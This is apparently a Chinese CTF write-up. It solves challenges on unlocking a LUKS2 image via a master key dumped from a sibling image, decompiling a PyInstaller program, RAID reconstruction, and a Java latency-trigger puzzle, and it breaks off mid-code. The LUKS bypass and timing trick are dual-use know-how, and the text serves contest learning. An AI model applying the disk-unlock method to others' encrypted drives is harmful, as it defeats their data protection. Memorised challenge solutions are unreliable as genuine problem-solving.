*.img My Disk.img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 My Disk 2 .img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 \u53d1\u73b0\u90fd\u662f LUKS encrypted file \u5728 Kali Linux \u91cc\u5c1d\u8bd5\u76f4\u63a5\u6302\u8f7d\u7b2c\u4e00\u4e2a img\uff0c\u8981\u6c42\u8f93\u5165\u5bc6\u7801\uff0c\u628a\u9898\u7ed9\u7684\u5bc6\u7801\u8f93\u5165\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u8bfe\u4ef6\u201d \u4ee5\u4e0a\u90fd\u662f\u5df2\u77e5\u7684\u8bd5\u9a8c\u90e8\u5206\uff0c\u771f\u6b63\u8981\u505a\u7684\u662f\u89e3\u5f00\u7b2c\u4e8c\u4e2a\u672a\u77e5\u5bc6\u7801\u7684 LUKS img \u5df2\u77e5\u78c1\u76d8\u7684\u52a0\u5bc6\u4f7f\u7528\u7684\u662f luks2\uff0c\u5728\u7f51\u4e0a\u67e5\u4e86\u7834\u89e3 luks2 \u4e4b\u7c7b\u7684\u90fd\u8bf4 luks2 \u4e0d\u53ef\u7834\u89e3 \uff0c\u6216\u8005\u662f\u4f7f\u7528\u5df2\u77e5\u7684\u5bc6\u7801\u5b57\u5178\u6765\u7206\u7834 \u4f46\u662f\u9898\u91cc\u8bf4\u4e86 \u201c \u968f\u673a\u751f\u6210 \u7684\u5f3a\u5bc6\u7801\u201d\uff0c\u6240\u4ee5\u4e5f\u662f\u6ca1\u6709\u5bc6\u7801\u5b57\u5178\u7684 \u5176\u5b9e\u8fd9\u9053\u9898\u7684\u6700\u5927\u63d0\u793a\u5c31\u5728\u4e8e\u5b83\u7ed9\u4e86\u4e24\u4e2a img\uff0c\u65e2\u7136\u7b2c\u4e00\u4e2a img \u6253\u5f00\u540e\u4ec5\u4ec5\u662f\u4e00\u4e2a\u8bfe\u4ef6\uff0c\u5982\u679c\u5b83\u7684\u7528\u5904\u4ec5\u4ec5\u662f\u7528\u6765\u8bd5\u9a8c luks \u600e\u4e48\u6253\u5f00\u7684\u8bdd\uff0c\u6839\u672c\u5b83\u6ca1\u5fc5\u8981\u7ed9\u51fa \u6240\u4ee5\u7b2c\u4e00\u4e2a img \u80af\u5b9a\u8fd8\u662f\u6709\u7528\u7684\u3002 \u518d\u770b\u9898\u76ee\uff0c\u53cd\u590d\u8bf4\u4e86 U \u76d8\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a img \u5e94\u8be5\u662f\u540c\u4e00\u4e2a U \u76d8\u7684\u955c\u50cf\u6587\u4ef6\uff0c\u53ea\u662f\u66f4\u6539\u4e86\u5bc6\u7801\u800c\u5df2\uff08file \u770b\u5230\u7684 uuid \u4e5f\u662f\u4e00\u81f4\u7684\uff09 \u4e8e\u662f\u7ee7\u7eed\u5fc5\u5e94\uff0c\u53d1\u73b0\u540c\u4e00\u4e2a\u78c1\u76d8\u7684 master-key \u662f\u4e00\u6837\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u7528 master-key \u6765\u6dfb\u52a0\u5bc6\u7801\u6062\u590d\u78c1\u76d8\uff08\u89c1\uff1a 10 Linux cryptsetup Examples for LUKS Key Management \uff09 \u6240\u4ee5\u5c31\u8ddf\u7740\u6587\u7ae0\u91cc\u7684\u505a\u6cd5\uff0c\u4ece\u7b2c\u4e00\u4e2a img \u4e2d\u63d0\u53d6\u51fa master-key\uff0c\u7136\u540e\u7528\u5b83\u6765\u63d0\u4f9b AddKey \u7684\u6743\u9650\u3002\u6dfb\u52a0\u4e86\u65b0 passphrase \u540e\u5c31\u53ef\u4ee5\u7528\u65b0\u5bc6\u7801\u6253\u5f00\u78c1\u76d8\u4e86\uff1a $ cryptsetup luksDump --dump-master-key MyDisk.img # \u8f93\u51fa master-key ... MK dump: be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a $ cat \"be...9a\" > master_key.txt # \u5b58\u5165\u6587\u4ef6 $ xxd -r -p master_key.txt master_key.bin # \u8f6c\u4e3a\u4e8c\u8fdb\u5236 $ cryptsetup luksAddKey MyDisk2.img --master-key-file < ( cat master_key.bin ) # \u6dfb\u52a0\u5bc6\u7801 Enter new passphrase for key slot: # \u8f93\u5165\u65b0\u5bc6\u7801\u5373\u53ef\uff0c\u56e0\u4e3amaster-key-file\u76f8\u5f53\u4e8e\u63d0\u4f9b\u4e86\u539f\u59cb\u5bc6\u7801 Verify passphrase: \uff08\u4e00\u5b9a\u8981\u7528 root \u6743\u9650\u624d\u53ef\u4ee5\u52a0\u5bc6\u7801\uff09 \u7136\u540e\u6302\u8f7d\u3001\u8f93\u5165\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 flag.txt \u4e86 \u8d5b\u535a\u53a8\u623f \u00b6 \u867d\u7136\u8fd9\u662f\u4f60\u7684\u9910\u5385\uff0c\u4f46\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u5728\u53a8\u623f\u5de5\u4f5c\u3002\u673a\u5668\u4eba\u7cbe\u786e\u5730\u6309\u7167\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u5728\u53a8\u623f\u4e2d\u79fb\u52a8\uff0c\u4ece\u7269\u54c1\u6e90\u53d6\u51fa\u98df\u6750\uff0c\u6309\u7167\u83dc\u8c31\u7684\u987a\u5e8f\u628a\u98df\u6750\u4f9d\u6b21\u653e\u5165\u9505\u5185\u3002 \u673a\u5668\u4eba\u4e0d\u9700\u8981\u4f11\u606f\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u665a\u4e0a\u7684\u65f6\u95f4\u6765\u5b66\u4e60\u4f60\u6559\u7ed9\u5b83\u7684\u7a0b\u5e8f\uff0c\u5728\u6b64\u4e4b\u540e\u4f60\u5c31\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u8ba9\u673a\u5668\u4eba\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u7684\u6bcf\u4e00\u6b65\u6267\u884c\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u4f60\u68c0\u67e5\u673a\u5668\u4eba\u505a\u83dc\u7684\u8fc7\u7a0b\u3002 \u53e6\u5916\u4e3a\u4e86\u7b26\u5408\u98df\u54c1\u5b89\u5168\u6cd5\u7684\u8981\u6c42\uff0c\u8d5b\u535a\u53a8\u623f\u4e2d\u7684\u673a\u5668\u4eba\u540c\u4e00\u65f6\u95f4\u624b\u91cc\u53ea\u80fd\u62ff\u4e00\u79cd\u98df\u7269\uff0c\u6bcf\u6b21\u505a\u83dc\u524d\u90fd\u5fc5\u987b\u6267\u884c\u6e05\u7406\u53a8\u623f\u7684\u64cd\u4f5c\uff0c\u628a\u5404\u5904\u7684\u98df\u7269\u6b8b\u6e23\u6e05\u7406\u6389\uff0c\u7136\u540e\u56de\u5230\u53a8\u623f\u89d2\u843d\u5f85\u547d\u3002 \u6bcf\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4e0d\u540c\uff0c\u4f46\u4e5f\u8bb8\u4e5f\u5b58\u5728\u4e00\u4e9b\u89c4\u5f8b\u3002 \u5bf9\u673a\u5668\u4eba\u7f16\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4\u6709\uff08n, m \u4e3a\u6574\u6570\u53c2\u6570\uff0c\u7a0b\u5e8f\u7684\u884c\u53f7\u4ece 0 \u5f00\u59cb\uff0c\u6ce8\u610f\u6307\u4ee4\u4e2d\u9700\u8981\u6b63\u786e\u4f7f\u7528\u7a7a\u683c\uff09\uff1a \u5411\u4e0a n \u6b65 \u5411\u4e0b n \u6b65 \u5411\u5de6 n \u6b65 \u5411\u53f3 n \u6b65 \u653e\u4e0b n \u4e2a\u7269\u54c1 \u62ff\u8d77 n \u4e2a\u7269\u54c1 \u653e\u4e0b\u76d8\u5b50 \u62ff\u8d77\u76d8\u5b50 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0b\u8df3\u8f6c m \u884c \u8d76\u7d27\u8fdb\u5165\u8d5b\u535a\u53a8\u623f\u5f00\u59cb\u505a\u83dc\u5427\uff01 \u521a\u770b\u9898\u8fd8\u662f\u633a\u61f5\u7684\uff0c\u60f3\u4e86\u597d\u534a\u5929\u624d\u660e\u767d \u7b80\u5355\u8bf4\u6765\u5c31\u662f\uff0c\u6bcf\u5929\u53ef\u4ee5\u7f16\u5199\u65b0\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u53ea\u80fd\u8fd0\u884c\u4e00\u4e2a\u4e4b\u524d\u7f16\u5199\u8fc7\u7684\u7a0b\u5e8f \u6bcf\u4e2a\u7a0b\u5e8f\u53ea\u6709\u51e0\u79cd\u6307\u4ee4\u53ef\u4ee5\u4f7f\u7528\uff0c\u9700\u8981\u5728\u5176\u4e2d\u6ee1\u8db3\u83dc\u8c31\u7684\u987a\u5e8f\u8981\u6c42 \u800c\u95ee\u9898\u5728\u4e8e\uff0c\u7f16\u5199\u7a0b\u5e8f\u540e\u7684\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4f1a\u4e0d\u540c\uff0c\u5bfc\u81f4\u524d\u9762\u7f16\u5199\u7684\u7a0b\u5e8f\u65e0\u6cd5\u4f7f\u7528 \u6240\u4ee5\u5c31\u9700\u8981 \u9884\u6d4b \u7b2c\u4e8c\u5929\u7684\u83dc\u8c31 Level 0 \u00b6 \u53ef\u4ee5\u770b\u5230\u7b2c 0 \u5929\u7684\u83dc\u8c31\u662f 1, 0\uff0c\u4e5f\u5c31\u662f\u8981\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u4f9d\u6b21\u5411\u9505(1,0)\u4e2d\u653e\u5165 1 \u53f7\u98df\u7269(0,2)\u548c 0 \u53f7\u98df\u7269(0,1) \u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\uff0c\u76f4\u63a5\u5230\u4e0b\u4e00\u5929\uff0c\u53ef\u4ee5\u53d1\u73b0\u83dc\u8c31\u53d1\u751f\u4e86\u53d8\u5316 \u591a\u6b21\u5c1d\u8bd5\u4e4b\u540e\u53d1\u73b0\u83dc\u8c31 \u53ea\u6709 0,0 / 0,1 / 1,0 / 1,1 \u56db\u79cd \u6240\u4ee5\u5728\u7b2c 0 \u5929\u7f16\u5199\u5b66\u4e60\u56db\u4e2a\u7a0b\u5e8f\uff0c\u5230\u4e0b\u4e00\u5929\u5c31\u53ef\u4ee5\u6839\u636e\u83dc\u8c31\u6765\u6267\u884c\u4e86 \u4f8b\u5982\u7a0b\u5e8f 1,0 \u5c31\u53ef\u4ee5\u7f16\u5199\u4e3a\uff1a \u5411\u53f3 2 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 2 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u5411\u53f3 1 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u53ea\u8981\u6b63\u786e\u4e86\u4e00\u5929\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 Level 1 \u00b6 \u53ea\u6709 1 \u4e2a\u98df\u7269\uff0c\u83dc\u8c31\u662f\u597d\u591a 0 \u540c\u6837\u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\u8fdb\u5165\u4e0b\u4e00\u5929\uff0c\u53d1\u73b0\u83dc\u8c31 \u6ca1\u6709\u53d8\u5316 \uff0c\u8fd8\u662f 73 \u4e2a 0 \u6240\u4ee5\u8fd9\u4e00\u5173\u53ef\u80fd\u53ea\u662f\u5faa\u73af\u7684\u6559\u7a0b \u53ef\u7528\u7684\u6307\u4ee4\u4e2d\u6709\u4e00\u6761 \u201c\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c\u201d \u53ef\u4ee5\u7528\u5b83\u6765\u8fbe\u5230 \u5faa\u73af \u7684\u6548\u679c \u53ea\u9700\u8981\u62ff 73 \u4e2a\u7269\u54c1\uff0c\u7136\u540e\u5faa\u73af\u653e\u4e0b\u76f4\u5230\u624b\u4e2d\u6ca1\u6709\u4e86\u5373\u53ef \u5411\u53f3 1 \u6b65 \u62ff\u8d77 73 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e 1 \u5411\u4e0a\u8df3\u8f6c 1 \u884c \u540c\u6837\u4fdd\u5b58\u4e0b\u4e00\u5929\u6267\u884c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 \u5269\u4e0b\u7684\u4e24\u4e2a\u770b\u8d77\u6765\u5927\u6982\u662f\u901a\u8fc7\u6e90\u7801\u6765\u63a8\u6d4b\u51fa\u83dc\u8c31\u7684\u751f\u6210\u65b9\u6cd5\uff0c\u7136\u540e\u7f16\u5199\u76f8\u5e94\u7684\u6307\u4ee4\uff0c\u592a\u96be\u4e86\uff0c\u4e0d\u4f1aqwq Micro World \u00b6 \u5b87\u5b99\u4e2d\u67d0\u4e00\u7247\u6781\u5176\u5fae\u5c0f\u7684\u533a\u57df\u91cc\u7684\u7c92\u5b50\u88ab\u4e00\u80a1\u795e\u79d8\u529b\u91cf\u521d\u59cb\u5316\u8bbe\u7f6e\u6210\u4e86 flag \u7684\u5f62\u72b6\uff0c\u7a0b\u5e8f\u5fe0\u5b9e\u5730\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u3002 \u62ff\u5230\u4e86 exe \u6587\u4ef6\uff0c\u770b\u8d77\u6765\u633a\u7cbe\u81f4\uff0c\u8fd0\u884c\u8d77\u6765\u662f\u4e00\u4e9b\u70b9\u8fd0\u52a8\u78b0\u649e\u7684\u573a\u666f \u62d6\u5230 IDA \u91cc\u770b\u770b\uff0c\u53d1\u73b0\u4e86 __main__ \u4ee5\u53ca .rdata \u91cc\u4e00\u4e9b py \u6709\u5173\u7684\u5b57\u7b26\u4e32\uff1a \u6240\u4ee5\u63a8\u6d4b\u662f\u4f7f\u7528 python \u7f16\u5199\u7684\uff0c\u7136\u540e\u7528 pyinstaller \u6253\u5305 \u8fd9\u6837\u7684\u8bdd\u8bd5\u7740\u7528 pyinstxtractor \u89e3\u5305 .exe\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u91cc\u9762\u662f\u4e00\u5806 .pyc .pyd .dll \u6587\u4ef6\uff0c\u4ece\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u5927\u90e8\u5206\u662f import \u7684\u5305\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684 2.pyc \u6240\u4ee5\u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u7f16\u8bd1\u540e\u7684\u6e90\u7801\u4e86 \u63a5\u4e0b\u6765\u7528 uncompyle6 \u6765\u53cd\u7f16\u8bd1 pyc \u6587\u4ef6\uff0c\u8f93\u51fa\u5f97\u5230\u4e86\u6e90\u7801 2.py \u5c1d\u8bd5\u8fd0\u884c\uff0c\u53d1\u73b0\u8dd1\u8d77\u6765\u4e4b\u540e\u53ea\u6709\u4e00\u4e2a\u70b9\u5728\u8fd0\u52a8\uff0c\u5e94\u8be5\u662f\u53cd\u7f16\u8bd1\u65f6\u51fa\u4e86\u4e9b\u95ee\u9898 \u4e8e\u662f\u5f00\u59cb\u770b\u6e90\u7801 \u57fa\u672c\u4e0a\u7b80\u5355\u8bf4\u5c31\u662f\uff0c\u521d\u59cb\u6709\u4e00\u4e9b\u6570\u636e\uff0c\u8868\u793a\u6bcf\u4e2a\u70b9\u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\uff0c\u7136\u540e\u8fd0\u884c\uff0c\u6bcf\u6b21\u8fd0\u884c\u90fd\u68c0\u6d4b\u78b0\u649e\uff0c\u7136\u540e\u83b7\u5f97\u65b0\u7684\u70b9\u4f4d\u7f6e\uff0c\u518d\u7ed8\u5236\u51fa\u6765 \u8c03\u8bd5\u4e00\u4e0b\uff0c\u8f93\u51fa\u6bcf\u6b21\u7684 pointlist\uff0c\u53d1\u73b0\u7b2c\u4e00\u6b21\u662f\u6240\u6709\u70b9\uff0c\u7b2c\u4e8c\u6b21\u53d8\u62102\u4e2a\uff0c\u7b2c\u4e09\u6b21\u5f80\u540e\u5c31\u53ea\u6709\u4e00\u4e2a\u4e86 \u6240\u4ee5\u95ee\u9898\u5927\u6982\u5c31\u51fa\u5728\u4e86 next_pos_list \u51fd\u6570\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: times = checkcrush ( Pointlist [ i ], point ) if times != None : a , b = get_new_point ( times , Pointlist [ i ], point ) pointlist . extend ([ a , b ]) Pointlist [ i ] . flag = 0 point . flag = 0 else : for item in Pointlist : if item . flag != 0 : pointlist . append ( Point (( item . x + item . vx , item . y + item . vy ), item . vx , item . vy )) for poi in pointlist : poi . x = poi . x % WIDTH poi . y = poi . y % HEIGHT else : return pointlist \u4ed4\u7ec6\u8bfb\u4e00\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u9762\u7684 for-else \u5757\u5f88\u5947\u602a\uff0c\u5bfc\u81f4\u5faa\u73af\u7ed3\u675f\u548c return \u90fd\u65e9\u4e86\uff0c\u6240\u4ee5\u6839\u636e\u51fd\u6570\u7684\u610f\u601d\u6539\u4e00\u6539\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: ... for item in Pointlist : ... return pointlist \u8fd9\u6837\u5c31\u53ef\u4ee5\u6210\u529f\u8fd0\u884c\u4e86 \u4f46\u662f\u753b\u9762\u4ecd\u7136\u662f\u6742\u4e71\u7684\u3002\u56e0\u4e3a\u9898\u91cc\u8bf4\u4e86 \u201c\u8bb0\u5f55\u4e86 \u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e \u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u201d \u6240\u4ee5\u9700\u8981\u5c06\u8f68\u8ff9\u5f80\u524d\u63a8\uff0c\u6700\u65b9\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u66f4\u6539\u6bcf\u4e2a\u70b9\u7684\u901f\u5ea6\u65b9\u5411\uff1a Pointlist = [] for item in list_ : Pointlist . append ( Point (( item [ 0 ], item [ 1 ]), - item [ 2 ], - item [ 3 ])) \u8fd0\u884c\u540e\u7b49\u5f85\u4e00\u5c0f\u4f1a\u513f\u5c31\u53ef\u4ee5\u770b\u5230\u70b9\u9010\u6e10\u6709\u5e8f\uff0c\u5728\u67d0\u4e00\u523b\u6c47\u6210\u4e86 flag\uff1a \u867d\u7136\u4e0d\u592a\u6e05\u6670\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u731c\u4e2a\u5927\u6982 \u9635\u5217\u6062\u590d\u5927\u5e08 \u00b6 \uff08\u8fd9\u9898\u6574\u6574\u505a\u4e86\u6211\u4e24\u5929\u591a\uff0c\u6bcf\u5929\u665a\u4e0a\u90fd\u5bf9\u7740\u78c1\u76d8\u9635\u5217\u2026\u2026\uff09 \u4ee5\u4e0b\u662f\u4e24\u4e2a\u538b\u7f29\u5305\uff0c\u5206\u522b\u662f\u4e00\u4e2a RAID 0 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u548c\u4e00\u4e2a RAID 5 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u5bf9\u5e94\u672c\u9898\u7684\u4e24\u5c0f\u95ee\u3002\u4f60\u9700\u8981\u89e3\u6790\u5f97\u5230\u6b63\u786e\u5b8c\u6574\u7684\u78c1\u76d8\u9635\u5217\uff0c\u6302\u8f7d\u7b2c\u4e00\u4e2a\u5206\u533a\u540e\u5728\u8be5\u5206\u533a\u6839\u76ee\u5f55\u4e0b\u4f7f\u7528 Python 3.7 \u6216\u4ee5\u4e0a\u7248\u672c\u6267\u884c getflag.py \u811a\u672c\u4ee5\u83b7\u53d6 flag\u3002\u78c1\u76d8\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\u3002 RAID 5 \u00b6 \u867d\u7136 RAID 5 \u662f\u7b2c\u4e8c\u95ee\uff0c\u800c\u4e14\u5206\u6570\u9ad8\uff0c\u4f46\u662f\u66f4\u597d\u505a\uff0c\u800c\u4e14\u505a\u51fa\u7684\u4eba\u4e5f\u591a\u3002 \u56e0\u4e3a\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\uff0c\u6240\u4ee5\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u627e\u51fa\u4e94\u4e2a\u78c1\u76d8\u7684\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u987a\u5e8f\u53ef\u4ee5\u5148\u7b80\u5355\u5730\u770b\u770b strings *.img \u8f93\u51fa\u7684\u5185\u5bb9 \u9010\u4e2a\u6587\u4ef6\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u6587\u4ef6\u6bd4\u8f83\u9760\u524d\u7684\u5730\u65b9\u4f1a\u6709\u4e00\u6bb5\u662f git \u5386\u53f2\u8bb0\u5f55\u7684\u4e00\u90e8\u5206: \u6839\u636e\u91cc\u9762\u7684\u65f6\u95f4\u53ef\u4ee5\u63a8\u65ad\u51fa\u78c1\u76d8\u7684\u987a\u5e8f\u5927\u81f4\u662f\uff1a Qj... -> 60... -> 3R... -> Ir... -> 3D... \u53ea\u662f\uff0c\u8fd9\u4e2a\u987a\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a\u73af\uff0c\u8c01\u5728\u7b2c\u4e00\u8fd8\u6ca1\u533a\u5206\u51fa\u6765 \u5728\u770b\u6bcf\u4e2a\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u53ea\u6709 60... \u548c 3R... \u6709 \u201cEFI PART\u201d: \u6240\u4ee5\u5e94\u8be5\u662f\u4e00\u4e2a\u5728\u5f00\u5934\uff0c\u4e00\u4e2a\u5728\u7ed3\u5c3e\u3002\u6240\u4ee5\u6700\u7ec8\u7684\u987a\u5e8f\u662f\uff1a 3R... -> Ir... -> 3D... -> Qj... -> 60... \u7136\u540e\u9700\u8981\u627e\u5230\u5757\u5927\u5c0f \u76f4\u63a5\u4e22\u5230 DiskGenius \u91cc\u7ec4\u5efa\u865a\u62df RAID\uff0c\u9009\u5de6\u540c\u6b65\uff0c\u7136\u540e\u53ef\u4ee5\u8bd5\u51fa\u6765\u5f53\u5757\u5927\u5c0f\u662f 64k \u7684\u65f6\u5019\u6b63\u597d\u53ef\u4ee5\u62fc\u51fa\u5b8c\u6574\u78c1\u76d8 \u7136\u540e\u514b\u9686\u78c1\u76d8\u751f\u6210 img \u6587\u4ef6\uff0c\u518d\u6302\u8f7d\uff0c\u8fdb\u5165\uff0c\u6267\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag RAID 0 \u00b6 \u5728\u505a RAID 5 \u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u53eb Raid Reconstructor \u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7206\u7834 RAID \u9635\u5217\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u6240\u4ee5\u8fd9\u95ee\u4e5f\u5c31\u61d2\u5f97\u770b\u4e86\uff0c\u76f4\u63a5\u4e22\u7ed9 Raid Reconstructor \u6765\u7206\u7834\uff0c\u5f97\u5230\u6700\u63a8\u8350\u7684\u987a\u5e8f\uff1a wl. -> jC. -> 1G. -> 5q. -> d3. -> eR. -> RA. -> ID. \u548c\u5757\u5927\u5c0f 128k \u7136\u540e\u76f4\u63a5\u7528 Raid Reconstructor \u7684 Copy \u5bfc\u51fa img \u6587\u4ef6\uff0c\u63d0\u53d6\u540e\u53c8\u5f97\u5230\u4e00\u4e2a\u65b0\u7684 img \u6587\u4ef6 \u901a\u8fc7 file \u53ef\u4ee5\u770b\u5230\u7ed3\u679c\u7684\u6587\u4ef6\u7cfb\u7edf\u662f XFS $ file MyDisk.img MyDisk.img: SGI XFS filesystem data ( blksz 4096 , inosz 512 , v2 dirs ) \u4f46\u662f\u59cb\u7ec8\u65e0\u6cd5\u6302\u8f7d\uff08\u641e\u4e86\u4e00\u5929\uff09 \u53ef\u80fd\u662f Raid Reconstructor \u7684\u95ee\u9898\uff0c\u6240\u4ee5\u53c8\u7528 DiskGenius \u8bd5\u4e86\u4e0b \u56e0\u4e3a win \u548c DiskGenius \u8bfb\u4e0d\u4e86 XFS \u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u62fc\u8d77\u6765\u4e4b\u540e\u76f4\u63a5\u514b\u9686\u51fa img \u6587\u4ef6 \u7136\u540e\u62d6\u5230 Kali Linux \u91cc\u6302\u8f7d\uff0c\u6210\u529f\u6302\u8f7d\u540e\u8fdb\u5165\u3001\u8fd0\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag \u52a9\u8bb0\u8bcd \u00b6 \u9898\u76ee\u6709\u6548\u5185\u5bb9\uff1a \u4f60\u7684\u5ba4\u53cb\u7ec8\u4e8e\u8fde\u591c\u8d76\u5b8c\u4e86\u4ed6\u7684 Java \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u8bfe\u7a0b\u5927\u4f5c\u4e1a\u3002\u770b\u8d77\u6765\u4ed6\u4f7f\u7528 Java 17 \u5199\u4e86\u4e00\u4e2a\u4fdd\u5b58\u52a9\u8bb0\u8bcd\u7684\u540e\u7aef\uff0c\u5f53\u7136\u8fd8\u6709\u914d\u5957\u7684\u524d\u7aef\u3002\u52a9\u8bb0\u8bcd\u7531\u56db\u4e2a\u82f1\u6587\u5355\u8bcd\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7528\u6237\u6700\u591a\u4fdd\u5b58 32 \u6761\u3002 \u4f60\u4ece\u4ed6\u5145\u6ee1\u6fc0\u60c5\u5374\u53c8\u5939\u6742\u4e0d\u6e05\u7684\u8868\u8ff0\u4e2d\u5f97\u77e5\uff0c\u4ed6\u4f3c\u4e4e\u8fd8\u4e3a\u6b64\u4e13\u95e8\u5728\u5927\u4f5c\u4e1a\u91cc\u85cf\u4e86\u4e24\u4e2a flag\uff1a\u5f53\u8bbf\u95ee\u5ef6\u8fdf\u8fbe\u5230\u4e24\u4e2a\u7279\u6b8a\u7684\u9608\u503c\u65f6\uff0cflag \u4fbf\u4f1a\u6253\u5370\u51fa\u6765\uff0c\u5c4a\u65f6\u4f60\u4fbf\u53ef\u4ee5\u62ff\u7740 flag \u8ba9\u4f60\u7684\u5ba4\u53cb\u8bf7\u4f60\u5403\u4e00\u987f\u5927\u9910\u3002 \u4e0b\u8f7d\u5230\u6e90\u7801\u540e\u7ffb\u4e00\u7ffb\uff0c\u6709\u7528\u7684\u5c31\u53ea\u6709 Phrase.java \u548c Instance.java \u5176\u4e2d Phrase.java \u5b9a\u4e49\u4e86 Phrase\uff0c\u5176\u4e2d\u91cd\u8f7d\u4e86 equals \u65b9\u6cd5\uff0c\u5176\u4e2d\u6709\uff1a try { TimeUnit . MILLISECONDS . sleep ( EQUALS_DURATION_MILLIS ); // 20ms // TODO: remove it since it is for debugging } catch ( InterruptedException e ) { throw new RuntimeException ( e ); } \u6240\u4ee5\u5728\u6bcf\u6b21\u6bd4\u8f83\u76f8\u7b49\u7684\u65f6\u5019\u5c31\u4f1a sleep 20ms \u800c Instance.java \u7684 post \u65b9\u6cd5\u4e2d\u5bf9\u4e8e\u6bcf\u6b21\u7684\u8f93\u5165\uff0c\u904d\u5386\u8f93\u5165\u7684\u5217\u8868\uff0c\u7136\u540e\u9010\u4e2a\u52a0\u8fdb HashMap \u4e2d \u5728\u52a0\u5165 HashMap \u7684\u65f6\u5019\u5c31\u6d89\u53ca\u5230\u5224\u65ad\u662f\u5426\u76f8\u7b49 \u800c\u6700\u7ec8\u4f1a\u5224\u65ad\u5728\u5b8c\u6210\u524d\u540e\u7684\u603b\u7684\u65f6\u95f4\u95f4\u9694\u662f\u591a\u5c11\uff0c\u5982\u679c\u5927\u4e8e 600ms \u5c31\u63d0\u53d6\u51fa\u7b2c\u4e00\u4e2a flag\uff1a var modified = 0 ; var before = System . nanoTime (); for ( var i = 0 ; i < input . length () && i < MAX_PHRASES && phrases . size () < MAX_PHRASES ; ++ i ) { var text = input . optString ( i , \"\" ). toLowerCase ( Locale . ENGLISH ); modified += phrases . add ( 